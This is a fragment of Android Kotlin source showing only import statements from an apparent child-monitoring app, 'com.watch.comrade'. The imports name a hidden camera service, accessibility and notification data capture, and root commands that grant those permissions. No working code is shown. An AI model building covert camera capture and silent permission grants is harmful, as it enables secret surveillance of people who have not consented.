...
import com.watch.comrade.utils.ConstFun.isNotificationServiceRunning
import com.watch.comrade.utils.hiddenCameraServiceUtils.HiddenCameraUtils.canOverDrawOtherApps
import com.watch.comrade.utils.hiddenCameraServiceUtils.HiddenCameraUtils.openDrawOverPermissionSetting
import com.watch.comrade.utils.hiddenCameraServiceUtils.config.CameraFacing
import com.watch.comrade.utils.ConstFun.openUseAccessSettings
import com.watch.comrade.utils.checkForegroundApp.CheckPermission.hasUsageStatsPermission
...
import com.watch.comrade.data.preference.DataSharePreference.childSelected
import com.watch.comrade.services.accessibilityData.AccessibilityDataService
import com.watch.comrade.utils.ConstFun.isAddWhitelist
import com.watch.comrade.utils.ConstFun.isAndroidM
import com.watch.comrade.utils.ConstFun.openAccessibilitySettings
import com.watch.comrade.utils.ConstFun.openNotificationListenerSettings
import com.watch.comrade.utils.ConstFun.openWhitelistSettings
import com.watch.comrade.utils.ConstFun.permissionRoot
import com.watch.comrade.utils.ConstFun.showApp
import com.watch.comrade.utils.Consts
import com.watch.comrade.utils.Consts.CHILD_NAME
import com.watch.comrade.utils.Consts.COMMAND_ADD_WHITELIST
import com.watch.comrade.utils.Consts.COMMAND_ENABLE_ACCESSIBILITY
import com.watch.comrade.utils.Consts.COMMAND_ENABLE_ACCESSIBILITY_1
import com.watch.comrade.utils.Consts.COMMAND_ENABLE_NOTIFICATION_LISTENER
import com.watch.comrade.utils.Consts.COMMAND_GRANT_PERMISSION
import com.watch.comrade.utils.Consts.DEVICE_NAME
import com.watch.comrade.utils.Consts.INTERVAL
import com.watch.comrade.utils.Consts.PERMISSION_USAGE_STATS
import com.watch.comrade.utils.Consts.TIMER
import com.watch.comrade.utils.async.AsyncTaskRunCommand
import com.watch.comrade.utils.checkForegroundApp.CheckPermission.getModeManager
